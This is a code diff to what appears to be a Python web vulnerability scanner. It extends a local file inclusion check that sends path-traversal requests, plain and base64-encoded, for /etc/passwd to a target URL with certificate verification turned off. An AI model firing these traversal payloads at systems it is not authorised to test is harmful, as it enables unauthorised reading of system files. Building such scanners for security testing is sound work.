@@ -1,6 +1,7 @@
 from Wappalyzer import Wappalyzer, WebPage
 import requests
 import vulners
+import base64
 import json
 import os
 
@@ -45,7 +46,7 @@ class Scanner:
 
     def request_tamp(self, url):
         return "Soon To Be Updated"
-
+    
     def exploit_info(self,url):
         req = requests.get(url)
         headers = req.headers
@@ -199,17 +200,28 @@ class Scanner:
             return ""
 
     def test_lfi(url):
-        payload = "../../../../../../../../../../etc/passwd"
-        fattempt = f"{url}{payload}"
-        req = requests.get(fattempt,verify=False)
+        payload1 = "../../../../../../../../../../etc/passwd"
+        payload2 = "/etc/passwd"
+        payload3 = base64.b64encode(payload2.encode('utf-8'))
+        payload3 = str(payload3,'utf-8')
+        payload4 = base64.b64encode(payload1.encode('utf-8'))
+        payload4 = str(payload4,'utf-8')
+        fattempt = f"{url}{payload1}"
+        sattempt = f"{url}{payload2}"
+        tattempt = f"{url}{payload3}"
+        ftattempt = f"{url}{payload4}"
+        req1 = requests.get(fattempt,verify=False)
+        req2 = requests.get(sattempt,verify=False)
+        req3 = requests.get(tattempt,verify=False)
+        req4 = requests.get(ftattempt,verify=False)
         #print(req.text)
-        if req.status_code == 200:
-            if 'root' in req.text:
+        if req1.status_code == 200 or req2.status_code == 200 or req3.status_code == 200 or req4.status_code == 200:
+            if 'root' in req1.text or 'root' in req2.text or 'root' in req3.text or 'root' in req4.text:
                 return "LFI(Local File Inclusion)"
             else:
                 return ""
         else:
-            if 'root:x:' in req.text:
+            if 'root:x:' in req1.text or 'root:x:' in req2.text or 'root:x:' in req3.text or 'root:x:' in req4.text:
                 return "LFI(Local File Inclusion)"
             else:
                 return ""
